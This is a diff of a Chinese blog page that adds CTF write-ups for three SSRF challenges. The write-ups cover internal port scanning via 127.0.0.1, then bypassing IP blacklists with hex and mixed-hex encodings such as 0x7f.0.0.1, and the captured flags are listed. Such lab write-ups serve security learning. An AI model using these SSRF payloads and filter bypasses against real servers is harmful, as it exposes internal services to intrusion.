@@ -308,9 +308,9 @@
     </li>
     <li><a href="#ezssrf">EZSSRF</a>
       <ol>
-        <li><a href="#ezssrf-1">EZSSRF</a></li>
-        <li><a href="#ezssrf_1">EZSSRF_1</a></li>
-        <li><a href="#ezssrf_2">EZSSRF_2</a></li>
+        <li><a href="#ezssrf基础-ssrf-内网端口探测">EZSSRF（基础 SSRF 内网端口探测）</a></li>
+        <li><a href="#ezssrf_1ssrf--ip-黑名单绕过--十六进制编码">EZSSRF_1（SSRF + IP 黑名单绕过 — 十六进制编码）</a></li>
+        <li><a href="#ezssrf_2ssrf--ip-多重编码绕过--混合十六进制表示法">EZSSRF_2（SSRF + IP 多重编码绕过 — 混合十六进制表示法）</a></li>
         <li><a href="#ezssrf_3">EZSSRF_3</a></li>
         <li><a href="#ezssrf_4">EZSSRF_4</a></li>
         <li><a href="#ezssrf_5">EZSSRF_5</a></li>
@@ -464,7 +464,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 7 分钟
+                    阅读时长: 11 分钟
                 </time>
             </div>
         
@@ -481,7 +481,7 @@
 
 
 
-                <span class="article-time--wordcount">3392 字</span>
+                <span class="article-time--wordcount">5219 字</span>
             </div>
         
     </footer>
@@ -1106,10 +1106,270 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="ezssrf">EZSSRF
-</h2><h3 id="ezssrf-1">EZSSRF
-</h3><h3 id="ezssrf_1">EZSSRF_1
-</h3><h3 id="ezssrf_2">EZSSRF_2
-</h3><h3 id="ezssrf_3">EZSSRF_3
+</h2><h3 id="ezssrf基础-ssrf-内网端口探测">EZSSRF（基础 SSRF 内网端口探测）
+</h3><p><strong>漏洞类型：</strong> 服务端请求伪造（SSRF - Server-Side Request Forgery）— 内网端口探测</p>
+<p><strong>题目分析：</strong></p>
+<p>目标页面是一个&quot;VIP 用户专属内网服务&quot;，提供一个 URL 输入框，服务端会代为请求用户输入的 URL。页面提示：</p>
+<ul>
+<li>内部网关服务运行中，需输入正确的 IP/端口</li>
+<li>VIP 用户专用端口在 8888~9999 之间</li>
+</ul>
+<p>关键点：</p>
+<ul>
+<li>服务端对用户输入的 URL 发起请求，并将响应内容回显到页面上</li>
+<li>可以访问 <code>127.0.0.1</code>（本地回环），说明存在 SSRF 漏洞</li>
+<li>需要通过 SSRF 探测内网中 8888~9999 范围内的服务端口</li>
+</ul>
+<p><strong>攻击思路：</strong> 利用 SSRF 逐一探测内网端口 → 找到开放的内部服务 → 访问内部服务的敏感路径获取 flag</p>
+<p><strong>Step 1：确认 SSRF 可用</strong></p>
+<p>首先验证服务端确实会代为请求，访问 80 端口（返回页面本身）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">url=http://127.0.0.1:80/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>返回页面自身内容，确认 SSRF 可用。</p>
+<p><strong>Step 2：探测内网端口</strong></p>
+<p>根据提示，端口范围在 8888~9999 之间。逐一扫描：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># 批量探测 8888-9999 范围内的端口
+</span></span><span class="line"><span class="cl">url=http://127.0.0.1:8888/  # → Failed to connect
+</span></span><span class="line"><span class="cl">url=http://127.0.0.1:8889/  # → Failed to connect
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">url=http://127.0.0.1:9001/  # → HTTP 200，返回 &#34;欢迎您，尊敬的vip用户。现在您可以访问管理员admin面板&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现端口 <strong>9001</strong> 开放，返回 VIP 用户欢迎信息，并提示可以访问管理员 admin 面板。</p>
+<p><strong>Step 3：探测内部服务路径</strong></p>
+<p>在 9001 端口上探测 admin 相关路径：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># 探测 admin 面板
+</span></span><span class="line"><span class="cl">url=http://127.0.0.1:9001/admin        # → HTTP 200, 44 bytes
+</span></span><span class="line"><span class="cl">url=http://127.0.0.1:9001/admin/flag    # → HTTP 200, 42 bytes，返回 flag！
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Step 4：获取 Flag</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">url=http://127.0.0.1:9001/admin/flag
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>页面响应中直接回显 flag：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{9581e95e-75a6-43e3-81a2-bb5668212002}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Flag：</strong> <code>flag{9581e95e-75a6-43e3-81a2-bb5668212002}</code></p>
+<h3 id="ezssrf_1ssrf--ip-黑名单绕过--十六进制编码">EZSSRF_1（SSRF + IP 黑名单绕过 — 十六进制编码）
+</h3><p><strong>漏洞类型：</strong> 服务端请求伪造（SSRF）+ IP 黑名单绕过</p>
+<p><strong>题目分析：</strong></p>
+<p>与 EZSSRF 基础题相同的网站结构，提供一个 URL 输入框让服务端代为请求，但增加了 IP 黑名单过滤：</p>
+<ul>
+<li>直接使用 <code>127.0.0.1</code> → 返回 <code>Blocked IP</code></li>
+<li>使用 <code>localhost</code> → 返回 <code>Blocked host</code></li>
+<li>IPv6 <code>[::1]</code> → 连接失败（服务端不支持 IPv6）</li>
+<li>页面 HTML 注释提示：VIP 用户专用端口在 8888~9999 之间</li>
+<li>服务端返回响应状态码和内容长度，可作为端口探测信号</li>
+</ul>
+<p><strong>过滤测试：</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># 被拦截的 IP 表示方式
+</span></span><span class="line"><span class="cl">url=http://127.0.0.1:9001/       # ✗ Blocked IP
+</span></span><span class="line"><span class="cl">url=http://localhost:9001/       # ✗ Blocked host
+</span></span><span class="line"><span class="cl">url=http://0.0.0.0:9001/         # ✗ Blocked IP
+</span></span><span class="line"><span class="cl">url=http://[::1]:9001/           # ✗ 连接失败
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># 可绕过的方式
+</span></span><span class="line"><span class="cl">url=http://0x7f000001:9001/      # ✓ 十六进制编码绕过，HTTP 200
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>绕过思路：</strong> 服务端对 IP 黑名单的检测仅匹配点分十进制格式（<code>127.0.0.1</code>）和 <code>localhost</code> 字符串，但底层的 HTTP 客户端库（如 PHP cURL）支持多种 IP 表示方式。使用十六进制编码 <code>0x7f000001</code>（即 <code>127.0.0.1</code> 的十六进制表示）即可绕过黑名单检测。</p>
+<p><strong>Step 1：确认 SSRF 及 IP 黑名单存在</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">url=http://127.0.0.1:9001/
+</span></span><span class="line"><span class="cl"># 返回 &#34;Blocked IP&#34;，确认黑名单生效
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Step 2：十六进制编码绕过 IP 黑名单</strong></p>
+<p><code>127.0.0.1</code> 的十六进制表示为 <code>0x7f000001</code>（<code>127=0x7F, 0=0x00, 0=0x00, 1=0x01</code>）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">url=http://0x7f000001:9001/
+</span></span><span class="line"><span class="cl"># 返回 HTTP 200，75 bytes
+</span></span><span class="line"><span class="cl"># 响应内容：&#34;欢迎您，尊敬的vip用户。现在您可以访问管理员admin面板&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Step 3：探测内部服务路径</strong></p>
+<p>在 9001 端口上探测 admin 相关路径：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">url=http://0x7f000001:9001/admin
+</span></span><span class="line"><span class="cl"># 返回 HTTP 200，44 bytes → &#34;Internal Admin Panel&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">url=http://0x7f000001:9001/admin/flag
+</span></span><span class="line"><span class="cl"># 返回 HTTP 200，42 bytes → flag！
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Step 4：获取 Flag</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">url=http://0x7f000001:9001/admin/flag
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>页面响应中直接回显 flag：</p>
+<p><strong>Flag：</strong> <code>flag{1160e55c-f0a1-40f9-b15a-31c73d0654dc}</code></p>
+<h3 id="ezssrf_2ssrf--ip-多重编码绕过--混合十六进制表示法">EZSSRF_2（SSRF + IP 多重编码绕过 — 混合十六进制表示法）
+</h3><p><strong>漏洞类型：</strong> 服务端请求伪造（SSRF）+ IP 黑名单多重编码绕过</p>
+<p><strong>题目分析：</strong></p>
+<p>在 EZSSRF_1 的基础上，本题进一步加强了 IP 黑名单过滤，封堵了常见的 IP 编码绕过方式：</p>
+<ul>
+<li><code>127.0.0.1</code> → <code>Blocked IP</code></li>
+<li><code>0x7f000001</code>（纯十六进制）→ <code>Hex IP not allowed</code></li>
+<li><code>0177.0.0.1</code>（八进制）→ <code>Octal IP not allowed</code></li>
+<li><code>2130706433</code>（十进制整数）→ <code>Integer IP not allowed</code></li>
+<li><code>127.1</code>（短格式）→ <code>Loopback range blocked</code></li>
+<li><code>0x7f.0.0.1</code>（混合十六进制表示法）→ <strong>绕过成功！HTTP 200</strong></li>
+</ul>
+<p><strong>过滤测试：</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># 全部被拦截的方式
+</span></span><span class="line"><span class="cl">url=http://127.0.0.1:9001/           # ✗ Blocked IP
+</span></span><span class="line"><span class="cl">url=http://0x7f000001:9001/          # ✗ Hex IP not allowed
+</span></span><span class="line"><span class="cl">url=http://0177.0.0.1:9001/          # ✗ Octal IP not allowed
+</span></span><span class="line"><span class="cl">url=http://2130706433:9001/          # ✗ Integer IP not allowed
+</span></span><span class="line"><span class="cl">url=http://017700000001:9001/        # ✗ Integer IP not allowed
+</span></span><span class="line"><span class="cl">url=http://127.1:9001/               # ✗ Loopback range blocked
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># 绕过成功的方式
+</span></span><span class="line"><span class="cl">url=http://0x7f.0.0.1:9001/          # ✓ 混合十六进制，HTTP 200
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>绕过思路：</strong> 服务端分别检测了纯十六进制（<code>0x7f000001</code>）、八进制（<code>0177.0.0.1</code>）、整数（<code>2130706433</code>）等格式，但遗漏了<strong>混合十六进制表示法</strong> <code>0x7f.0.0.1</code>——只有第一个八位组用十六进制 <code>0x7f</code>（=127）表示，其余为正常十进制。底层 HTTP 客户端库（PHP cURL）能正确解析这种混合格式，但 WAF 的正则未覆盖此模式。</p>
+<p><strong>Step 1：确认多重过滤规则</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">url=http://127.0.0.1:9001/          # → Blocked IP
+</span></span><span class="line"><span class="cl">url=http://0x7f000001:9001/         # → Hex IP not allowed
+</span></span><span class="line"><span class="cl">url=http://0177.0.0.1:9001/         # → Octal IP not allowed
+</span></span><span class="line"><span class="cl">url=http://2130706433:9001/         # → Integer IP not allowed
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Step 2：混合十六进制表示法绕过</strong></p>
+<p>将 <code>127</code> 写为 <code>0x7f</code>，其余保持十进制，组成 <code>0x7f.0.0.1</code>：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">url=http://0x7f.0.0.1:9001/
+</span></span><span class="line"><span class="cl"># 返回 HTTP 200，75 bytes
+</span></span><span class="line"><span class="cl"># 响应内容：&#34;欢迎您，尊敬的vip用户。现在您可以访问管理员admin面板&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Step 3：探测内部服务路径</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">url=http://0x7f.0.0.1:9001/admin
+</span></span><span class="line"><span class="cl"># 返回 HTTP 200，44 bytes → &#34;Internal Admin Panel&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">url=http://0x7f.0.0.1:9001/admin/flag
+</span></span><span class="line"><span class="cl"># 返回 HTTP 200，42 bytes → flag！
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Step 4：获取 Flag</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">url=http://0x7f.0.0.1:9001/admin/flag
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Flag：</strong> <code>flag{7b23f7e3-92fb-4a65-95d5-091852f917af}</code></p>
+<h3 id="ezssrf_3">EZSSRF_3
 </h3><h3 id="ezssrf_4">EZSSRF_4
 </h3><h3 id="ezssrf_5">EZSSRF_5
 </h3><h3 id="ezssrf_6">EZSSRF_6
